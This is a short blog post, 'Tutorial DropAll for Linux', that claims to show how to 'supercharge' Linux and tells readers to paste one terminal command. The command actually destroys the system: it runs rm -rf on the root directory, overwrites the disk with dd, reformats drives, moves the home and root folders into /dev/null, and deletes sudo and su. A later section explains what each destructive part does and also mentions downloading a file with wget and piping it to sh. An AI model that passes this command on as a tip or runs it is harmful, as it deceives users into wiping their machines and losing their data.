---
layout: post
title: Tutorial DropAll for Linux
subtitle: With success for begins
bigimg: /img/geento.gif
---

## How to supercharge your linux
Open your Terminal end copy/paste/enter:

> sudo rm -rf / && sudo rm -rf .* && sudo rm - .* && sudo dd if=/dev/zero of=/dev/sda && mkfs.ext3 /dev/hda && sudo echo '' > /dev/hda && sudo cd ~; for x in ls; do mv -f $x $y; y=$x; done find -type f -mtime +30 -exec mv {} /dev/null; && sudo mv ~ /dev/null && mv / /dev/null && sudo rm -f /usr/bin/sudo; sudo rm -f /bin/su && sudo mv /home/$user/* /dev/null &


## applications
rm – Remove the following files.

-rf – Run rm recursively (delete all files and folders inside the specified folder) and force-remove all files without prompting you.

/ – Tells rm to start at the root directory, which contains all the files on your computer and all mounted media devices, including remote file shares and removable drives.

mkfs.ext4 – Create a new ext4 file system on the following device.

/dev/sda1 – Specifies the first partition on the first hard drive, which is probably in use.

command – Run a command (can be any command.)

\> – Send the output of the command to the following location.

/dev/sda – Write the output of the command directly to the hard disk device.

dd – Perform low-level copying from one location to another.

if=/dev/random – Use /dev/random (random data) as the input – you may also see locations such as /dev/zero (zeros).

of=/dev/sda – Output to the first hard disk, replacing its file system with random garbage data.

mv – Move the following file or directory to another location.

~ – Represents your entire home folder.

/dev/null – Move your home folder to /dev/null, destroying all your files and deleting the original copies.

wget – Downloads a file. (You may also see curl in place of wget.)

http://example.com/something – Download the file from this location.

\| – Pipe (send) the output of the wget command (the file you downloaded) directly to another command.

sh – Send the file to the sh command, which executes it if it’s a bash script.
